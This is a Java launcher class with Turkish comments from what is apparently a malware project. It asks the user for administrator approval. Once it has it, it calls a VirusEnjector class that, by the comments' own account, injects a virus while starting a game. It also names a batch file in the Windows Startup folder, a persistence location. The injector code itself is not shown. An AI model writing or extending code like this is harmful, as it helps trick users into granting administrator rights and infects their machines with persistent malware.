package com.byrfb;

import com.byrfb.administor.SUDO;
import com.byrfb.administor.SuperUserApplication;

import javax.swing.*;
import java.io.IOException;

public class Launcher extends SuperUserApplication {
    public static void main(String[] arg) {

        //Başlangıç dosyası alınması için kullanılıyor
        String startPah = "C:\\Users\\ByRfb//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//drun.bat".replace("//","\\");


        SUDO.run(new Launcher(), arg);


    }


    @Override
    public int runAdministor(String[] strings) {
        try {
            // Virusun enjekte edilme işlemini yapan classa ulaşıp virus enjekte oyun başlatma ve virus başlatma işlemleri yapılıyor
            new VirusEnjector().enject();
            System.exit(0);

        } catch (IOException e) {
            e.printStackTrace();
        }
        return 0;
    }

    @Override
    public int runNotAdministor() {

        JOptionPane.showMessageDialog(null,
                "Lutfen Administor olarak onaylayınız",
                "Uyarı",
                JOptionPane.WARNING_MESSAGE);
        return 0;
    }
}